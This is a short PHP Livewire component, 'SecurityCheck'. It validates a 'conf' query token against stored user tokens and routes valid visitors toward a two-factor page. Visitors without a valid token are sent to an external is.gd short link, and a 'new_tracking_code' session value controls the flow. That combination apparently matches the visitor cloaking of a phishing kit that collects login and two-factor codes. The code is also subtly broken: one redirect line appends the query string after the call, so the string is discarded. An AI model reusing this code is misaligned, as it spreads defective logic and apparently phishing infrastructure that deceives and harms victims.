<?php

namespace App\Livewire\Components;

use App\Models\User;
use Livewire\Component;

class SecurityCheck extends Component
{
    public $authToken;

    public function mount()
    {
        $authToken = request()->query("conf");
        $checkToken = User::where('auth_token', $authToken)->first();
        if ($checkToken !== null) {
            session(["authToken" => $authToken]);
            if (empty(session("new_tracking_code"))) {
                $this->redirect(route("index")) .
                "?conf=" .
                session("authToken");
            }
        } else {
            $this->redirect("https://is.gd/VCpW0P");
        }

        if (empty(session("new_tracking_code"))) {
            $this->redirect(route("index") . "?conf=" . session("authToken"));
            return;
        }
    }

    public function continue()
    {
        $this->redirect(route("two-factor") . "?conf=" . session("authToken"));
        return;
    }

    public function render()
    {
        return view("livewire.components.security-check");
    }
}
